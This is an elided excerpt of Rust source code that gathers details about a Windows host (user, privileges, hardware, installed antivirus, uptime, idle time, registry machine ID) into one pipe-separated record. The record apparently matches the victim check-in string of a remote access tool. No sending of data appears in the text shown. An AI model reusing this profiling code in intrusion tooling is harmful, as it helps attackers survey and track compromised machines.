...
pub fn record(target: &str, ping_ms: Option<u128>, fp: &str) -> String {
    ...
    let afk = afk();
    let country = if matches!(target, "127.0.0.1" | "::1" | "localhost") { "Local" } else { "Unknown" };
    let hwid = machine_id().unwrap_or_else(|| fallback_display_hwid());
    [
        country.into(), nickname, text::TAG.into(), user, text::VERSION.into(), privileges,
        "Windows".into(), gpu, cpu, ram, antivirus, uptime, afk,
        ping_ms.map_or_else(|| "Unknown".into(), |v| format!("{v} ms")), hwid, fp.to_owned(),
    ].into_iter().map(clean).collect::<Vec<_>>().join("|")
}
...
fn machine_id() -> Option<String> {
    #[cfg(windows)] {
        ...
        return s.lines().find_map(|line| {
            ...
            let _ty = p.next()?;
            let value = p.next()?;
            key.eq_ignore_ascii_case(text::REG_QUERY_KEY).then(|| value.to_string())
        });
    }
    #[cfg(not(windows))]
    { None }
...
fn afk() -> String {
    #[cfg(windows)] {
        #[repr(C)]
        struct LastInput { cb_size: u32, tick: u32 }
        #[link(name = "user32")]
        unsafe extern "system" { fn GetLastInputInfo(info: *mut LastInput) -> i32; }
        #[link(name = "kernel32")]
        unsafe extern "system" { fn GetTickCount() -> u32; }
        let mut info = LastInput { cb_size: core::mem::size_of::<LastInput>() as u32, tick: 0 };
...
fn ps(script: &str) -> String {
    ...
    #[cfg(not(windows))] { let _ = script; String::new() }
}
...
mod tests {
    ...
    fn fingerprint_contract() {
        assert_eq!(from_id("00112233-4455-6677-8899-aabbccddeeff"), "df5d93dab28d0df783ecafe806a225c622d128a792c12c5f16f756faf563ee2d");
    }
